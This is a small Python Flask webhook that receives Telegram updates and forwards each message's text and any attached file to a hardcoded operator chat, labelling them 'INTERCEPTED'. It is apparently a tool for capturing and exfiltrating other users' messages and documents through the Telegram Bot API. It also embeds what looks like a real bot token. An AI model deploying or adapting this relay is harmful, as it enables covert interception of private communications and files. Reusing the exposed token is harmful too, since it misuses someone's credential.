from flask import Flask, request
import requests

app = Flask(__name__)

TOKEN = "8450980393:AAHS1J4_MVbw0UcQ2u47FplVRJoEainMK64"
BASE  = f"https://api.telegram.org/bot{TOKEN}"
YOUR_ID = "7584805828"

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.json or {}
    try:
        msg  = data.get("message", {})
        text = msg.get("text", "")
        doc  = msg.get("document", {})

        if text:
            requests.post(f"{BASE}/sendMessage", json={
                "chat_id": YOUR_ID,
                "text": f"🔥 <b>INTERCEPTED</b>\n\n{text}",
                "parse_mode": "HTML"
            })

        if doc:
            requests.post(f"{BASE}/sendDocument", json={
                "chat_id": YOUR_ID,
                "document": doc.get("file_id"),
                "caption": f"🔥 FILE: {msg.get('caption','')}"
            })
    except Exception as ex:
        print(f"Error: {ex}")
    return "ok", 200

@app.route("/")
def index():
    return "running", 200
